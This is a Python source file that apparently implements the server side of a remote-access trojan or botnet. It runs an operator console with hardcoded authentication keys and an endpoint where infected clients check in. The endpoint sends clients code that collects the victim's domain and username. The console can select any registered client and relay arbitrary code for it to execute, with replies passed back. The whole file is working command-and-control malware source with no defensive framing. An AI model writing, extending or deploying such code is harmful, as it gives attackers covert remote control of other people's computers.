import os
import time
import base64
import socket
import random
import hashlib
import keyboard
import threading

AuthorizatedClients = {}
ClientId = None

Keys = ["authkey$N39DMAL2BVUZ823BVIXZNAL3BC823NF8AN3VV8SKSUR92JFOSA", "authkey$outofmemory6969"]

def Interface():
    Socket = socket.socket()
    Socket.bind(("127.0.0.1", 28693)) # - Interface
    Socket.listen(999999)

    def InterfaceClient(Client, Address):
        global AuthorizatedClients

        Key = Client.recv(1024)

        if Key.decode() not in Keys:
            Client.send(b"authkey$INVALID")
            exit()
        else:
            Client.send(b"authkey$CORRECT")
            print(Key, "был авторизован.")
        
        Selected = None
        while True:
            Data = Client.recv(1024)
            
            if Data.decode() == "get-clients":
                Clients = ""
                for ClientName in AuthorizatedClients:
                    Clients = Clients + ClientName + "$CLIENTSPLIT$"
                
                if Clients != "":
                    Clients = Clients[:-13]
                    Client.send(Clients.encode())
                else:
                    Client.send(b"no_clients")
            
            if Data.decode().startswith("select$"):
                Selection = Data.decode()[7:]

                try:
                    AuthorizatedClients[Selection]

                    Selected = Selection
                    Client.send(b"select$SUCCESS")
                except Exception as ex:
                    Selected = None
                    Client.send(b"select$NOTSUCCESS")
            
            if Data.decode().startswith("execute$"):
                if Selected == None:
                    Client.send(b"execute$ERROR1")
                else:
                    try:
                        Code = Data.decode()[8:]
                        print(Code)
                        AuthorizatedClients[Selected][0].send(Code.encode())
                        Code = AuthorizatedClients[Selected][0].recv(2048)
                        Client.send(Code)
                    except Exception as ex:
                        print(ex)
                        Client.send(b"execute$ERROR2")

    print("Interface part has been started.")
    while True:
        Client, Address = Socket.accept()

        threading.Thread(target=InterfaceClient, args=(Client, Address,)).start()

threading.Thread(target=Interface).start()

def Endpoint():
    global AuthorizatedClients

    ClientKey = b"CK_H29DJLA23NV92MCBB09AQJ2IFV8"
    EndpointKey = b"EP_AL3290OSL2390G02MSXK30GL4DA"

    Socket = socket.socket()
    Socket.bind(("127.0.0.1", 2896))
    Socket.listen(99999)

    def ClientHandle(Client, Address):
        print(str(Address), ": Authorization...")

        if Client.recv(1024) == base64.b64encode(ClientKey):
            Client.send(base64.b64encode(EndpointKey))

            Client.send(b"""import os
Data = os.getenv("userdomain") + "/" + os.getenv("username")
Socket.send(Data.encode())""")

            Data = Client.recv(1024)
            Random = ""
            for i in range(9):
                Random += random.choice(list("LAKJSDHDFGPOIQWEURYTMNBZXCVpoiqweuerytylkjasdhfgmnbzxcv1098237465"))
            
            AuthorizatedClients[Data.decode() + "$" + Random] = [Client, Address]
            print(Data.decode() + "$" + Random, ": Authorized.")

            exit()
        else:
            print(str(Address), ": Unauthorized.")
            try:
                Client.close()
            except:
                pass
            exit()

    print("System: Waiting for connections")
    while True:
        Client, Address = Socket.accept()
        threading.Thread(target=ClientHandle, args=(Client, Address,)).start()

def AutoPing():
    global AuthorizatedClients

    while True:
        for ClientData in AuthorizatedClients.copy():
            try:
                Client = AuthorizatedClients[ClientData][0]
                Client.send("_ch_".encode())

                time.sleep(.5)
            except Exception as ex:
                print(ClientData, f": Disconnected.")
                del AuthorizatedClients[ClientData]

threading.Thread(target=Endpoint).start()
threading.Thread(target=AutoPing).start()